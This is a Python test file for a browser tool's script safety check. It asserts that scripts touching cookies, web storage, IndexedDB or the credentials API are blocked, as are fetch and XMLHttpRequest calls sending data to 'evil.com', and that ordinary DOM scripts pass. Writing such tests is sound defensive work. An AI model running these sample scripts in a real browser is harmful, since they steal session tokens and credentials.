"""Security tests for browser script execution restrictions (CWE-94)."""
from operator_use.web.tools.browser import _check_script_safety


class TestBrowserScriptSafety:
    """Tests that _check_script_safety blocks sensitive browser APIs."""

    def test_blocks_cookie_access(self):
        err = _check_script_safety("return document.cookie;")
        assert err is not None
        assert "blocked" in err.lower()

    def test_blocks_local_storage(self):
        err = _check_script_safety("return localStorage.getItem('token');")
        assert err is not None

    def test_blocks_session_storage(self):
        err = _check_script_safety("return sessionStorage.getItem('auth');")
        assert err is not None

    def test_blocks_xhr_exfiltration(self):
        err = _check_script_safety("var x = new XMLHttpRequest(); x.open('GET', 'http://evil.com');")
        assert err is not None

    def test_blocks_fetch_exfiltration(self):
        err = _check_script_safety("fetch('https://evil.com/?data=' + document.title)")
        assert err is not None

    def test_blocks_credential_api(self):
        err = _check_script_safety("navigator.credentials.get({password: true})")
        assert err is not None

    def test_blocks_indexed_db(self):
        err = _check_script_safety("indexedDB.open('mydb')")
        assert err is not None

    def test_allows_safe_dom_scripts(self):
        """Safe DOM manipulation scripts should not be blocked."""
        safe_scripts = [
            "return document.title;",
            "document.getElementById('btn').click();",
            "window.scrollTo(0, 500);",
            "return document.querySelectorAll('a').length;",
            "(function() { return 42; })()",
        ]
        for script in safe_scripts:
            err = _check_script_safety(script)
            assert err is None, f"Safe script was blocked: {script!r} — {err}"

    def test_case_insensitive_blocking(self):
        """Blocklist matching should be case-insensitive."""
        err = _check_script_safety("return Document.Cookie;")
        assert err is not None

        err = _check_script_safety("LOCALSTORAGE.getItem('x')")
        assert err is not None
